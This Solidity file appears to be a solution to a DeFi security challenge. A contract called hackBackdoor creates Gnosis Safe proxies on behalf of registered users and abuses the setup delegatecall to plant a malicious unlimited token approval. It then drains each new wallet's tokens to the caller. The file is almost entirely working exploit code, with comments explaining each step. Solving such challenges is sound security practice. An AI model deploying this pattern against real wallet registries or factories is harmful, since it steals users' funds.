pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisProxyFactory{
    function createProxyWithCallback(address, bytes memory, uint256, IProxyCreationCallback callback) external returns(GnosisSafeProxy);
}

contract hackBackdoor {
    
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);  
        }
    function hackIt(address[] calldata _users, address _factory, address _walletRegistry, address _singleTon, address _token) public {
        // Step-1 : We loop through all the users and deploy Gnosis Safe contract setting them as owners. 
        for(uint i;i< _users.length;i++){
        address[] memory owners = new address[](1);
        owners[0] = _users[i];
        // Step-2 : Create setupData. This data is initializer data that the proxy contract call on initialization. 
        // Gnosis safe allows a delegate call during initialization. We put our malicious data of approving the target token for that factory.  
        bytes memory _maliciousDelegateData = abi.encodeWithSignature("approve(address,address)",_token, address(this));
        bytes memory setupData = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", owners, 1, address(this), _maliciousDelegateData, address(0),0,0,0);
        // Step-3 : Deploy proxy with users as the owner of the proxy so that Walletregistry would send tokens to this deployed proxy. 
        GnosisSafeProxy proxy = IGnosisProxyFactory(_factory).createProxyWithCallback(_singleTon, setupData, 0, IProxyCreationCallback(_walletRegistry));
        // Step-4 : Transfer the allowed token of the proxy contract to the attacker. 
        IERC20(_token).transferFrom(address(proxy), msg.sender, IERC20(_token).balanceOf(address(proxy)));
        }

    }
}